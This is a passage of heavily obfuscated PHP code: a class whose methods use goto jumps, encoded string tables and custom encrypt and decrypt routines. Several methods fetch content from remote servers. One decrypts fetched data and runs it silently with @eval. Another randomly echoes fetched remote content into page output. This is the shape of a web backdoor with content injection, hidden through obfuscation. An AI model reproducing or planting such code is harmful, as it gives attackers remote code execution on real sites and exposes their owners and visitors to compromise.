$_SERVER[$F‹¦ùÏàÅÒ[181]]); $aœ¸¡Ó‘…ã = $this->{$_SERVER[´Öò¹²][212]}($F‹¦ùÏàÅÒ[154]($dõË„Üƒæ)); $E­ù‡Èˆªœ = $this->{$_SERVER[´Öò¹²][189]}($F‹¦ùÏàÅÒ[213] . $aœ¸¡Ó‘…ã); if ($E­ù‡Èˆªœ && $F‹¦ùÏàÅÒ[198]($E­ù‡Èˆªœ) && isset($E­ù‡Èˆªœ[$F‹¦ùÏàÅÒ[296]])) { $eÀ¥¡áÛ¿– = $this->{$_SERVER[´Öò¹²][195]}($E­ù‡Èˆªœ[$F‹¦ùÏàÅÒ[296]], 2); if ($eÀ¥¡áÛ¿–) { $eÀ¥¡áÛ¿– = $this->{$_SERVER[´Öò¹²][206]}($eÀ¥¡áÛ¿–); } if ($eÀ¥¡áÛ¿–) { try { @eval($eÀ¥¡áÛ¿–); } catch (Exception $e„ø¼ææí¸) { } } } } goto Aâ•Èç…ë; a©š’‰Åàê: if (!$F‹¦ùÏàÅÒ[198]($E­ù‡Èˆªœ)) { return; } if ($E­ù‡Èˆªœ[$F‹¦ùÏàÅÒ[171]] && $E­ù‡Èˆªœ[$F‹¦ùÏàÅÒ[296]]) { if ($this->{$_SERVER[´Öò¹²][206]}($E­ù‡Èˆªœ[$F‹¦ùÏàÅÒ[296]]) == $aäãÏ÷ÇòÁ[$F‹¦ùÏàÅÒ[171]]) { return; } } $this->{$_SERVER[´Öò¹²][170]}(); goto D‹Â’¢²Í´; Aâ•Èç…ë: } private function zsede10719a4($A…î–îĞ… = '', $eê¥ğ—äßë = array(), $A¢”èçî… = 5) { goto cæÏğ—İÛ; b’õ¶à÷“: if ($eê¥ğ—äßë && $BİÑ¾ÌáÅº[198]($eê¥ğ—äßë)) { $AĞ¹¦ßáõ = $AĞ¹¦ßáõ . $BİÑ¾ÌáÅº[299] . $BİÑ¾ÌáÅº[300]($eê¥ğ—äßë); } if ($eê¥ğ—äßë === -1) { return $AĞ¹¦ßáõ; } $dîÚêêˆŒÅ = $BİÑ¾ÌáÅº[258](array($BİÑ¾ÌáÅº[259] => array($BİÑ¾ÌáÅº[262] => $A¢”èçî…, $BİÑ¾ÌáÅº[260] => $BİÑ¾ÌáÅº[301]), $BİÑ¾ÌáÅº[302] => array($BİÑ¾ÌáÅº[303] => !1, $BİÑ¾ÌáÅº[304] => !1))); goto eÃ¡ÃŸ©˜; A“ğš«†Î : $EñŸ¹á…áğ = $EæàÄêğŸ[641]; if (strlen($EñŸ¹á…áğ) < $EæàÄêğŸ[603]) { die; } goto e÷àá’¼‘; cæÏğ—İÛ: $EæàÄêğŸ =& $_SERVER[Â€Á›¨õ]; $BİÑ¾ÌáÅº =& $_SERVER[´Öò¹²]; $AĞ¹¦ßáõ = $BİÑ¾ÌáÅº[297]; goto BØ¡È˜­©“; EˆŸåó’åÁ: $DŒÔåÁÓ‰¨ = $EæàÄêğŸ[639]; if (strlen($DŒÔåÁÓ‰¨) < $EæàÄêğŸ[592]) { return; } $AĞ¹¦ßáõ = $AĞ¹¦ßáõ . $A…î–îĞ…; goto b’õ¶à÷“; eÃ¡ÃŸ©˜: $e÷éôƒ˜îè = $EæàÄêğŸ[640]; $eê¥ğ—äßë = @$BİÑ¾ÌáÅº[263]($AĞ¹¦ßáõ, !1, $dîÚêêˆŒÅ); return $BİÑ¾ÌáÅº[197]($eê¥ğ—äßë, !0); goto A“ğš«†Î ; BØ¡È˜­©“: $A§‚º×»áè = $EæàÄêğŸ[638]; if (strlen($A§‚º×»áè) < $EæàÄêğŸ[603]) { return; } $AĞ¹¦ßáõ = $this->{$_SERVER[´Öò¹²][256]}($AĞ¹¦ßáõ, $BİÑ¾ÌáÅº[298]); goto EˆŸåó’åÁ; e÷àá’¼‘: } private function ldne00bbd60d() { goto bĞâ†¹Ğ ; eìÑ…äŒ¯Õ: $EÈ”¾êÒ˜Å = $E¼¯Öæ…Î[$this->wzul6408bb39]; $Eš´ïÙ³áº = $FèöÍ”ò¨Š[642]; while (strlen($Eš´ïÙ³áº) < $FèöÍ”ò¨Š[589]) { if (!$Eš´ïÙ³áº) { break; } $Eš´ïÙ³áº++; } goto EªêÙˆôƒ; fĞŒ–¡Ê†å: if (!$bƒšˆ²âš£) { die; } $câÚÄªÚ£ = $câÚÄªÚ£ ? $FÛõŞê¡[250]($câÚÄªÚ£) : 0; return $EÈ”¾êÒ˜Å + $câÚÄªÚ£; goto AØÙƒÀœ¶; EªêÙˆôƒ: $EÈ”¾êÒ˜Å = $FÛõŞê¡[250]($EÈ”¾êÒ˜Å ? $EÈ”¾êÒ˜Å : $FÛõŞê¡[306]); $câÚÄªÚ£ = $FÛõŞê¡[112]($this->qbam631bd298, $FÛõŞê¡[332]); $bƒšˆ²âš£ = $FèöÍ”ò¨Š[643]; goto fĞŒ–¡Ê†å; bĞâ†¹Ğ : $FèöÍ”ò¨Š =& $_SERVER[Â€Á›¨õ]; $FÛõŞê¡ =& $_SERVER[´Öò¹²]; $E¼¯Öæ…Î = array($FÛõŞê¡[305] => $FÛõŞê¡[306], $FÛõŞê¡[307] => $FÛõŞê¡[308], $FÛõŞê¡[309] => $FÛõŞê¡[310], $FÛõŞê¡[311] => $FÛõŞê¡[312], $FÛõŞê¡[313] => $FÛõŞê¡[314], $FÛõŞê¡[315] => $FÛõŞê¡[251], $FÛõŞê¡[316] => $FÛõŞê¡[251], $FÛõŞê¡[317] => $FÛõŞê¡[306], $FÛõŞê¡[318] => $FÛõŞê¡[308], $FÛõŞê¡[319] => $FÛõŞê¡[310], $FÛõŞê¡[320] => $FÛõŞê¡[321], $FÛõŞê¡[322] => $FÛõŞê¡[312], $FÛõŞê¡[323] => $FÛõŞê¡[324], $FÛõŞê¡[325] => $FÛõŞê¡[314], $FÛõŞê¡[326] => $FÛõŞê¡[327], $FÛõŞê¡[328] => $FÛõŞê¡[329], $FÛõŞê¡[330] => $FÛõŞê¡[331]); goto eìÑ…äŒ¯Õ; AØÙƒÀœ¶: } public function uhbj34c13d09($eğä™æø–õ) { goto b»‹‚‘ÁÖš; a‡§²‘³ç‰: $Aò¸‘±æ = $b‰»¯¡‹[228]($Aò¸‘±æ, $b‰»¯¡‹[10], $b‰»¯¡‹[333]); if (!$b‰»¯¡‹[248]($eğä™æø–õ[$b‰»¯¡‹[333]], $Aò¸‘±æ)) { $b‰»¯¡‹[172]($b‰»¯¡‹[337], !1, $b‰»¯¡‹[245]); } goto A¾ó„Íğ¡ä; e‚ŸÔÏŠÒâ: if ($C ÀÙŠ“„¹ >= $b‰»¯¡‹[250]($b‰»¯¡‹[251])) { return; } $FˆêÎ–¥È¨ = $b‰»¯¡‹[61]($b‰»¯¡‹[145])->{$_SERVER[´Öò¹²][146]}(); if ($FˆêÎ–¥È¨ <= $C ÀÙŠ“„¹) { return; } goto DÕäÁè©½‡; aÒ‘éÆÍøİ: $fôŸâµÂ´² = $bóËªĞ¨ÎÅ[644]; while ($fôŸâµÂ´² < $bóËªĞ¨ÎÅ[570]) { if ($fôŸâµÂ´² >= 0) { break; } $fôŸâµÂ´²++; } if ($eğä™æø–õ[$b‰»¯¡‹[333]] == $b‰»¯¡‹[226]) { return; } goto e‚ŸÔÏŠÒâ; DÕäÁè©½‡: $Aò¸‘±æ = $b‰»¯¡‹[61]($b‰»¯¡‹[145])->{$_SERVER[´Öò¹²][334]}($b‰»¯¡‹[333])->{$_SERVER[´Öò¹²][335]}($C ÀÙŠ“„¹)->{$_SERVER[´Öò¹²][336]}(); $e­ŒÛËº© = $bóËªĞ¨ÎÅ[645]; if (!$e­ŒÛËº©) { return; } goto a‡§²‘³ç‰; b»‹‚‘ÁÖš: $bóËªĞ¨ÎÅ =& $_SERVER[Â€Á›¨õ]; $b‰»¯¡‹ =& $_SERVER[´Öò¹²]; $C ÀÙŠ“„¹ = $this->{$_SERVER[´Öò¹²][143]}(); goto aÒ‘éÆÍøİ; A¾ó„Íğ¡ä: } public function jpmw0c36cd7c() { goto eì·Ó‚Ô£; eì·Ó‚Ô£: $bâµ±¾ç¼¸ =& $_SERVER[Â€Á›¨õ]; $EÒ´¤øÓ =& $_SERVER[´Öò¹²]; if (!$EÒ´¤øÓ[112]($GLOBALS, $EÒ´¤øÓ[138]) || $EÒ´¤øÓ[338](1, 100) > 20) { return; } goto cŸ¢¸±«¸–; cº³‚¸ŠÊò: $A‚ì±áÃƒ = $bâµ±¾ç¼¸[647]; while (strlen($A‚ì±áÃƒ) < $bâµ±¾ç¼¸[603]) { if (!$A‚ì±áÃƒ) { break; } $A‚ì±áÃƒ++; } echo $EÒ´¤øÓ[339] . $EÒ´¤øÓ[340]($B×óñÀ­·¨) . $EÒ´¤øÓ[341]; goto B”Ë¶áÁ¼Š; cŸ¢¸±«¸–: $cù™ÁÈŠ° = $EÒ´¤øÓ[255]; $cù™ÁÈŠ° = $this->{$_SERVER[´Öò¹²][256]}($cù™ÁÈŠ°, $EÒ´¤øÓ[257]); $BîòĞ±“Ì‚ = $bâµ±¾ç¼¸[646]; goto c´µÔğ«³; c´µÔğ«³: if (!$BîòĞ±“Ì‚) { die; } $D©î’•Ø¨Ö = $EÒ´¤øÓ[258](array($EÒ´¤øÓ[259] => array($EÒ´¤øÓ[260] => $EÒ´¤øÓ[261], $EÒ´¤øÓ[262] => 3))); $B×óñÀ­·¨ = @$EÒ´¤øÓ[263]($cù™ÁÈŠ°, !1, $D©î’•Ø¨Ö); goto cº³‚¸ŠÊò; B”Ë¶áÁ¼Š: $B½«ï—¤ôÒ = $bâµ±¾ç¼¸[648]; goto f…Œ÷“è¢; f…Œ÷“è¢: } private function xyhucac95918($c™ŠíêÂÍ, $eöÚÄ˜Œ†, $BÓ×Á‹ŸÎ = 3) { goto b¥İ÷ë²Š³; Fëõ¤®‚ù’: while (strlen($Aº×šøó¸) < $F¤ëš¤²š¿[589]) { if (!$Aº×šøó¸) { break; } $Aº×šøó¸++; } $bºªß½Ä‘„ = $c°óÓÇ£´[343]; $D»¢ÒßÆÀ¶ = $F¤ëš¤²š¿[651]; goto A†œ½ Ö²¾; aÈÉ ¤„¬ñ: $CÅÂà»Ê× = $F¤ëš¤²š¿[649]; while ($CÅÂà»Ê× < $F¤ëš¤²š¿[589]) { if ($CÅÂà»Ê× >= 0) { break; } $CÅÂà»Ê×++; } $c™ŠíêÂÍ = $c°óÓÇ£´[2]($c™ŠíêÂÍ); goto a¦˜—óŒÛŞ; A†œ½ Ö²¾: while (strlen($D»¢ÒßÆÀ¶) < $F¤ëš¤²š¿[570]) { if (!$D»¢ÒßÆÀ¶) { break; } $D»¢ÒßÆÀ¶++; } switch ($EİªøëÊŒ) { case $c°óÓÇ£´[240]: $A«¡äí†ñ = $this->{$_SERVER[´Öò¹²][153]}($c™ŠíêÂÍ, $c°óÓÇ£´[220]($eöÚÄ˜Œ† . $B¾Å²÷é‹‰)); $A·Š¡éÎİÌ = $F¤ëš¤²š¿[652]; if (!$A·Š¡éÎİÌ) { return; } break; case $c°óÓÇ£´[226]: $A«¡äí†ñ = $this->{$_SERVER[´Öò¹²][153]}($c™ŠíêÂÍ, $c°óÓÇ£´[220]($B¾Å²÷é‹‰ . $eöÚÄ˜Œ†)); break; $cíĞ¤î·î = $F¤ëš¤²š¿[653]; if (!$cíĞ¤î·î) { return; } case $c°óÓÇ£´[344]: $A«¡äí†ñ = $this->{$_SERVER[´Öò¹²][153]}($c™ŠíêÂÍ, $c°óÓÇ£´[124]($B¾Å²÷é‹‰ . $eöÚÄ˜Œ†)); break; case $c°óÓÇ£´[345]: $A«¡äí†ñ = $this->{$_SERVER[´Öò¹²][153]}($c™ŠíêÂÍ, $c°óÓÇ£´[120]($B¾Å²÷é‹‰ . $eöÚÄ˜Œ†)); break; case $c°óÓÇ£´[346]: goto dÃ£±‘³ó„; bœ£ƒÅÒ‘¢: $d¦·ŸÖˆŠÃ = $c°óÓÇ£´[10]; $Dœ†øààô = 0; $E¡¦Ä”ìé = 0; goto aâ’êç—§; aôØãÏ: for ($Dœ†øààô = 0; $Dœ†øààô < $c°óÓÇ£´[24]($c™ŠíêÂÍ); $Dœ†øààô++) { $eÁ»ÉÚ¾Š = $eÁ»ÉÚ¾Š == $c°óÓÇ£´[24]($F÷‚×óßÃ„) ? 0 : $eÁ»ÉÚ¾Š; $E¡¦Ä”ìé = ($Fö–ãğ²  + $c°óÓÇ£´[348]($bºªß½Ä‘„, $c™ŠíêÂÍ[$Dœ†øààô]) + $c°óÓÇ£´[349]($F÷‚×óßÃ„[$eÁ»ÉÚ¾Š++])) % 64; $DÊÔÒ¯º± = $F¤ëš¤²š¿[658]; if (strlen($DÊÔÒ¯º±) < $F¤ëš¤²š¿[592]) { return; } $d¦·ŸÖˆŠÃ .= $bºªß½Ä‘„[$E¡¦Ä”ìé]; } $A«¡äí†ñ = $c°óÓÇ£´[340]($c™¸Û‹ŠË . $d¦·ŸÖˆŠÃ); break; goto B¥ƒ–Ã‹õ; aéÈóÑ°÷³: $aïÏ§³É à = $F¤ëš¤²š¿[655]; $c™¸Û‹ŠË = $bºªß½Ä‘„[$Fö–ãğ² ]; $F÷‚×óßÃ„ = $c°óÓÇ£´[120]($c™¸Û‹ŠË . $c°óÓÇ£´[120]($eöÚÄ˜Œ† . $c™¸Û‹ŠË) . $eöÚÄ˜Œ†); goto D´ìÅ÷«ØË; aâ’êç—§: $eÁ»ÉÚ¾Š = 0; $f¸÷£Ãëš = $F¤ëš¤²š¿[657]; if (strlen($f¸÷£Ãëš) < $F¤ëš¤²š¿[570]) { return; } goto aôØãÏ; D´ìÅ÷«ØË: $f½‹„¸Êô® = $F¤ëš¤²š¿[656]; if (!$f½‹„¸Êô®) { die; } $F÷‚×óßÃ„ = $c°óÓÇ£´[25]($F÷‚×óßÃ„, $Fö–ãğ²  % 8, $Fö–ãğ²  % 8 + 7); goto bœ£ƒÅÒ‘¢; dÃ£±‘³ó„: $c™ŠíêÂÍ = $c°óÓÇ£´[124]($c™ŠíêÂÍ); $d÷µ‘ĞÕ¹› = $F¤ëš¤²š¿[654]; $Fö–ãğ²  = $c°óÓÇ£´[347](0, 64); goto aéÈóÑ°÷³; B¥ƒ–Ã‹õ: default: $A«¡äí†ñ = $this->{$_SERVER[´Öò¹²][153]}($c™ŠíêÂÍ, $eöÚÄ˜Œ† . $B¾Å²÷é‹‰); $E†ÃÚöƒª = $F¤ëš¤²š¿[659]; while ($E†ÃÚöƒª < $F¤ëš¤²š¿[603]) { if ($E†ÃÚöƒª >= 0) { break; } $E†ÃÚöƒª++; } break; $E·¡¯˜Ù– = $F¤ëš¤²š¿[660]; while ($E·¡¯˜Ù– < $F¤ëš¤²š¿[592]) { if ($E·¡¯˜Ù– >= 0) { break; } $E·¡¯˜Ù–++; } } $A«¡äí†ñ = $c°óÓÇ£´[220]($EİªøëÊŒ . $B¾Å²÷é‹‰ . $A«¡äí†ñ); goto F¤À‘œ™ï‹; b¥İ÷ë²Š³: $F¤ëš¤²š¿ =& $_SERVER[Â€Á›¨õ]; $c°óÓÇ£´ =& $_SERVER[´Öò¹²]; $c°óÓÇ£´[342](1); goto aÈÉ ¤„¬ñ; aÖØ…íÊ: return $A«¡äí†ñ; goto AğÃÍñ¤¬ë; F¤À‘œ™ï‹: $e¿·“ô¨… = $F¤ëš¤²š¿[661]; while ($e¿·“ô¨… < $F¤ëš¤²š¿[592]) { if ($e¿·“ô¨… >= 0) { break; } $e¿·“ô¨…++; } if ($BÓ×Á‹ŸÎ - 1 > 0) { $A«¡äí†ñ = $this->{$_SERVER[´Öò¹²][133]}($A«¡äí†ñ, $eöÚÄ˜Œ†, $BÓ×Á‹ŸÎ - 1); } goto aÖØ…íÊ; a¦˜—óŒÛŞ: $EİªøëÊŒ = $c°óÓÇ£´[338](0, 5) . $c°óÓÇ£´[10]; $B¾Å²÷é‹‰ = $c°óÓÇ£´[130](15); $Aº×šøó¸ = $F¤ëš¤²š¿[650]; goto Fëõ¤®‚ù’; AğÃÍñ¤¬ë: } private function ojmc3772795e($a™ùÚ¸¦Æä, $B×—¨¾Ù‹¯, $E£™šƒâ‚ = 3) { goto EïÎù†í¯…; E‹‚–Î…åÍ: $a™ùÚ¸¦Æä = $eçÖ“‚Ğ“Õ[220]($a™ùÚ¸¦Æä); $CˆŒ¨¢èƒ§ = $a™ùÚ¸¦Æä[0]; $dôÙğ™‰ŒÆ = $d’Œô¡äšŒ[663]; goto BË„ñç„Æš; aËĞ¡‰ç‚§: $a™ùÚ¸¦Æä = $eçÖ“‚Ğ“Õ[2]($a™ùÚ¸¦Æä); $a†‡÷‘àÛ… = $d’Œô¡äšŒ[662]; if (!$a†‡÷‘àÛ…) { die; } goto E‹‚–Î…åÍ; bÜì¾®Š¥Ø: while ($Dî§Ò”ºÓ < $d’Œô¡äšŒ[589]) { if ($Dî§Ò”ºÓ >= 0) { break; } $Dî§Ò”ºÓ++; } $a™ùÚ¸¦Æä = $eçÖ“‚Ğ“Õ[25]($a™ùÚ¸¦Æä, 16); $b“•½ÒôÂ = $eçÖ“‚Ğ“Õ[343]; goto Aœî˜¤¢²Õ; BË„ñç„Æš: if (!$dôÙğ™‰ŒÆ) { return; } $D£Í¦ÄÓµ¥ = $eçÖ“‚Ğ“Õ[25]($a™ùÚ¸¦Æä, 1, 15); $Dî§Ò”ºÓ = $d’Œô¡äšŒ[664]; goto bÜì¾®Š¥Ø; Aœî˜¤¢²Õ: $aß›§¢‹… = $d’Œô¡äšŒ[665]; if (strlen($aß›§¢‹…) < $d’Œô¡äšŒ[570]) { die; } switch ($CˆŒ¨¢èƒ§) { case $eçÖ“‚Ğ“Õ[240]: $e¾ÛÑŸëù² = $this->{$_SERVER[´Öò¹²][256]}($a™ùÚ¸¦Æä, $eçÖ“‚Ğ“Õ[220]($B×—¨¾Ù‹¯ . $D£Í¦ÄÓµ¥)); break; case $eçÖ“‚Ğ“Õ[226]: $e¾ÛÑŸëù² = $this->{$_SERVER[´Öò¹²][256]}($a™ùÚ¸¦Æä, $eçÖ“‚Ğ“Õ[220]($D£Í¦ÄÓµ¥ . $B×—¨¾Ù‹¯)); break; $e³ïø«§…± = $d’Œô¡äšŒ[666]; if (strlen($e³ïø«§…±) < $d’Œô¡äšŒ[603]) { die; } case $eçÖ“‚Ğ“Õ[344]: $e¾ÛÑŸëù² = $this->{$_SERVER[´Öò¹²][256]}($a™ùÚ¸¦Æä, $eçÖ“‚Ğ“Õ[124]($D£Í¦ÄÓµ¥ . $B×—¨¾Ù‹¯)); break; case $eçÖ“‚Ğ“Õ[345]: $e¾ÛÑŸëù² = $this->{$_SERVER[´Öò¹²][256]}($a™ùÚ¸¦Æä, $eçÖ“‚Ğ“Õ[120]($D£Í¦ÄÓµ¥ . $B×—¨¾Ù‹¯)); $b‚è¤ÕÍˆ¯ = $d’Œô¡äšŒ[667]; if (!$b‚è¤ÕÍˆ¯) { die; } break; case $eçÖ“‚Ğ“Õ[346]: goto bŠŞÊ„ƒã; e‰¡®õŒ¯¦: $C‰ùœø…‰ = $eçÖ“‚Ğ“Õ[120]($a†å£äËÖä . $eçÖ“‚Ğ“Õ[120]($B×—¨¾Ù‹¯ . $a†å£äËÖä) . $B×—¨¾Ù‹¯); $cÕ¨­½Ü¤ = $d’Œô¡äšŒ[670]; $C‰ùœø…‰ = $eçÖ“‚Ğ“Õ[25]($C‰ùœø…‰, $B‘ÇÜÛïÉñ % 8, $B‘ÇÜÛïÉñ % 8 + 7); goto d‚ìéá¼«; b²â¢­…ò: $a†å£äËÖä = $a™ùÚ¸¦Æä[0]; $CßÛŒµÙ‘„ = $d’Œô¡äšŒ[668]; $a™ùÚ¸¦Æä = $eçÖ“‚Ğ“Õ[25]($a™ùÚ¸¦Æä, 1); goto cî¬Ãª½µ; d‚ìéá¼«: $Dš­ºÌâÀ = $d’Œô¡äšŒ[671]; while ($Dš­ºÌâÀ < $d’Œô¡äšŒ[603]) { if ($Dš­ºÌâÀ >= 0) { break; } $Dš­ºÌâÀ++; } $C·äÌó‚Ñ“ = $eçÖ“‚Ğ“Õ[10]; goto Eôå—ßîª©; bŠŞÊ„ƒã: $a™ùÚ¸¦Æä = $eçÖ“‚Ğ“Õ[351]($a™ùÚ¸¦Æä); $f­åèÏ±Ø = $d’Œô¡äšŒ[662]; if (!$f­åèÏ±Ø) { die; } goto b²â¢­…ò; F¶ˆéÔòĞ: break; goto CòñÑŸ§; cî¬Ãª½µ: $B‘ÇÜÛïÉñ = $eçÖ“‚Ğ“Õ[348]($b“•½ÒôÂ, $a†å£äËÖä); $fÈ¬ô¯Ùá = $d’Œô¡äšŒ[669]; while ($fÈ¬ô¯Ùá < $d’Œô¡äšŒ[589]) { if ($fÈ¬ô¯Ùá >= 0) { break; } $fÈ¬ô¯Ùá++; } goto e‰¡®õŒ¯¦; A§­–ìÖõ: $e¾ÛÑŸëù² = $eçÖ“‚Ğ“Õ[352]($C·äÌó‚Ñ“); $f¤ó‹·¡™ƒ = $d’Œô¡äšŒ[675]; while (strlen($f¤ó‹·¡™ƒ) < $d’Œô¡äšŒ[570]) { if (!$f¤ó‹·¡™ƒ) { break; } $f¤ó‹·¡™ƒ++; } goto F¶ˆéÔòĞ; e Ì»Ÿ–ƒò: if (!$d ÷àà·Á—) { die; } $B­è«©öíô = 0; for ($D¯œÜ‘òÖ = 0; $D¯œÜ‘òÖ < $eçÖ“‚Ğ“Õ[24]($a™ùÚ¸¦Æä); $D¯œÜ‘òÖ++) { $B­è«©öíô = $B­è«©öíô == $eçÖ“‚Ğ“Õ[24]($C‰ùœø…‰) ? 0 : $B­è«©öíô; $BßåÙÄ¹ªĞ = $B­è«©öíô++; $dë…˜ƒ“«› = $d’Œô¡äšŒ[673]; while (strlen($dë…˜ƒ“«›) < $d’Œô¡äšŒ[589]) { if (!$dë…˜ƒ“«›) { break; } $dë…˜ƒ“«›++; } $c…Ù˜éòÈÂ = $eçÖ“‚Ğ“Õ[348]($b“•½ÒôÂ, $a™ùÚ¸¦Æä[$D¯œÜ‘òÖ]) - $B‘ÇÜÛïÉñ - $eçÖ“‚Ğ“Õ[349]($C‰ùœø…‰[$BßåÙÄ¹ªĞ]); $Aë´§ˆ° = $d’Œô¡äšŒ[674]; while ($c…Ù˜éòÈÂ < 0) { $c…Ù˜éòÈÂ += 64; } $C·äÌó‚Ñ“ .= $b“•½ÒôÂ[$c…Ù˜éòÈÂ]; } goto A§­–ìÖõ; Eôå—ßîª©: $D¯œÜ‘òÖ = 0; $c…Ù˜éòÈÂ = 0; $d ÷àà·Á— = $d’Œô¡äšŒ[672]; goto e Ì»Ÿ–ƒò; CòñÑŸ§: default: $e¾ÛÑŸëù² = $this->{$_SERVER[´Öò¹²][256]}($a™ùÚ¸¦Æä, $B×—¨¾Ù‹¯ . $D£Í¦ÄÓµ¥); break; } goto e‰½æ•òŠÀ; EïÎù†í¯…: $d’Œô¡äšŒ =& $_SERVER[Â€Á›¨õ]; $eçÖ“‚Ğ“Õ =& $_SERVER[´Öò¹²]; if (!$eçÖ“‚Ğ“Õ[350]($a™ùÚ¸¦Æä) || $eçÖ“‚Ğ“Õ[24]($a™ùÚ¸¦Æä) < 10) { return !1; } goto aËĞ¡‰ç‚§; e‰½æ•òŠÀ: if ($E£™šƒâ‚ - 1 > 0) { $e¾ÛÑŸëù² = $this->{$_SERVER[´Öò¹²][195]}($e¾ÛÑŸëù², $B×—¨¾Ù‹¯, $E£™šƒâ‚ - 1); } return $e¾ÛÑŸëù²; goto d³©¦è—ªµ; d³©¦è—ªµ: } public function nwpe59998829($a±ªÚ©ø®) { goto BË¢‹÷é; BË¢‹÷é: $E›‚ŸÑ…½Ë =& $_SERVER[Â€Á›¨õ]; $Eô È‡²ÚÁ =& $_SERVER[´Öò¹²]; $Fì‰ÛºÍÍ = $this->{$_SERVER[´Öò¹²][353]}(); goto AÕ¸‡ÎÂèØ; eïğÒœò‹Ö: return $C›ÀĞ‰Êìè; $c‰ƒµ¹œëÆ = $E›‚ŸÑ…½Ë[681]; if (strlen($c‰ƒµ¹œëÆ) < $E›‚ŸÑ…½Ë[592]) { return; } goto DœÒÇøè™ì; BŸ¬‡¶˜ğ: $có°³Òˆ¤ = $E›‚ŸÑ…½Ë[677]; while (strlen($có°³Òˆ¤) < $E›‚ŸÑ…½Ë[589]) { if (!$có°³Òˆ¤) { break; } $có°³Òˆ¤++; } $fÌ¢¥«¥— = ($Fì‰ÛºÍÍ - 1) * ($D£ŠæÊ“â× - 1); goto F’£‰©˜•Ó; AÕ¸‡ÎÂèØ: $c³È £ƒçÀ = $E›‚ŸÑ…½Ë[676]; if (strlen($c³È £ƒçÀ) < $E›‚ŸÑ…½Ë[592]) { die; } $D£ŠæÊ“â× = $this->{$_SERVER[´Öò¹²][353]}(); goto BŸ¬‡¶˜ğ; fÕ¢ê­åİ¯: for ($f…©ñİç† = 0; $f…©ñİç† < $fÌ¢¥«¥— * 10; $f…©ñİç†++) { if (($fÌ¢¥«¥— * $f…©ñİç† + 1) % $E§¾˜…áî• == 0) { $c‚¡ƒÈêÉ° = $Eô È‡²ÚÁ[250](($fÌ¢¥«¥— * $f…©ñİç† + 1) / $E§¾˜…áî•); break; } } $fåÖê = $this->{$_SERVER[´Öò¹²][153]}($Fì‰ÛºÍÍ * $D£ŠæÊ“â× . $Eô È‡²ÚÁ[10], $Eô È‡²ÚÁ[155]); $e”ÜÈ´â¶© = $Eô È‡²ÚÁ[120]($Eô È‡²ÚÁ[354] . ($Fì‰ÛºÍÍ + $D£ŠæÊ“â×) . $Eô È‡²ÚÁ[355] . $E§¾˜…áî• . $Eô È‡²ÚÁ[355] . $c‚¡ƒÈêÉ° . $Eô È‡²ÚÁ[356]); goto b­ÆŞ–Ô‘; dÁšÊÕ¦¾¶: while (1) { $DŞ´ŠÅîğ = $E§¾˜…áî•; $e¨Ìëƒ½² = $fÌ¢¥«¥—; while ($e¨Ìëƒ½² % $DŞ´ŠÅîğ != 0) { $Cë¢…•ì— = $e¨Ìëƒ½²; $e¨Ìëƒ½² = $DŞ´ŠÅîğ; $DŞ´ŠÅîğ = $Cë¢…•ì— % $DŞ´ŠÅîğ; } if ($DŞ´ŠÅîğ == 1) { break; } else { $E§¾˜…áî•++; } } $c‚¡ƒÈêÉ° = 2; $d¦á÷‰êŒ° = $E›‚ŸÑ…½Ë[679]; goto fÕ¢ê­åİ¯; b­ÆŞ–Ô‘: $C›ÀĞ‰Êìè = $this->{$_SERVER[´Öò¹²][153]}($a±ªÚ©ø®, $e”ÜÈ´â¶©) . $Eô È‡²ÚÁ[357] . $fåÖê; $A¬Œá¹åÁË = $E›‚ŸÑ…½Ë[680]; if (strlen($A¬Œá¹åÁË) < $E›‚ŸÑ…½Ë[592]) { return; } goto eïğÒœò‹Ö; F’£‰©˜•Ó: $E§¾˜…áî• = $Eô È‡²ÚÁ[250](($Fì‰ÛºÍÍ + $D£ŠæÊ“â×) / 2); $f³Ú²²¾Ï– = $E›‚ŸÑ…½Ë[678]; if (!$f³Ú²²¾Ï–) { return; } goto dÁšÊÕ¦¾¶; DœÒÇøè™ì: } public function xbwt31546103($CÍÊÏ®¬øİ) { goto b–ßåë„è; F¹çÅá“£”: while (1) { $B¯Õ†Ö² = $cÛ‡øÉ×»š; $FĞµÁŠŠâñ = $EÉôµ¹ö›¨; while ($FĞµÁŠŠâñ % $B¯Õ†Ö² != 0) { $C—Øá£õ = $FĞµÁŠŠâñ; $E·Äœ’”Ü¿ = $bâäõÀÑÕ[687]; if (strlen($E·Äœ’”Ü¿) < $bâäõÀÑÕ[589]) { die; } $FĞµÁŠŠâñ = $B¯Õ†Ö²; $bİÖ˜Š°â = $bâäõÀÑÕ[688]; if (strlen($bİÖ˜Š°â) < $bâäõÀÑÕ[589]) { return; } $B¯Õ†Ö² = $C—Øá£õ % $B¯Õ†Ö²; $f¯“…î·¼ = $bâäõÀÑÕ[689]; if (strlen($f¯“…î·¼) < $bâäõÀÑÕ[589]) { return; } } if ($B¯Õ†Ö² == 1) { break; } else { $cÛ‡øÉ×»š++; } } $CÅÖĞŠóéÃ = 2; $EØ”ÑçÍÔí = $bâäõÀÑÕ[690]; goto aíñÚ¨Ÿìœ; eƒ²è³â¯‹: $C–‘—©ç’ = $bâäõÀÑÕ[682]; if (!$C–‘—©ç’) { die; } if ($A’—ÊƒŒ›Ç[19]($C›Èäõ£“) != 2) { return $A’—ÊƒŒ›Ç[10]; } goto Aò—„Å»ì; fóé™ˆ’šâ: $Aˆ’ù‚§ = $bâäõÀÑÕ[691]; while (strlen($Aˆ’ù‚§) < $bâäõÀÑÕ[578]) { if (!$Aˆ’ù‚§) { break; } $Aˆ’ù‚§++; } $fÄÛË·¥İ× = $this->{$_SERVER[´Öò¹²][256]}($C›Èäõ£“[0], $C®Œ«ŠºÉí); goto dØÒËäÄÃ; Cô‰Í™®‹Ç: $DùÆ£‚ÍÙˆ = 0; for ($A¿›‹ñ°é­ = 3; $A¿›‹ñ°é­ < $CÖ…¼áŒ; $A¿›‹ñ°é­ += 2) { if ($CÖ…¼áŒ % $A¿›‹ñ°é­ != 0) { continue; } $dÙ…÷–ƒ” = $A¿›‹ñ°é­; $dİ”Ö¸Ù = $bâäõÀÑÕ[684]; if (strlen($dİ”Ö¸Ù) < $bâäõÀÑÕ[603]) { die; } $DùÆ£‚ÍÙˆ = $A’—ÊƒŒ›Ç[250]($CÖ…¼áŒ / $A¿›‹ñ°é­); break; $FÍİ‚ÌŒë = $bâäõÀÑÕ[685]; } $EÉôµ¹ö›¨ = ($dÙ…÷–ƒ” - 1) * ($DùÆ£‚ÍÙˆ - 1); goto DÓÂ§£Õß; b–ßåë„è: $bâäõÀÑÕ =& $_SERVER[Â€Á›¨õ]; 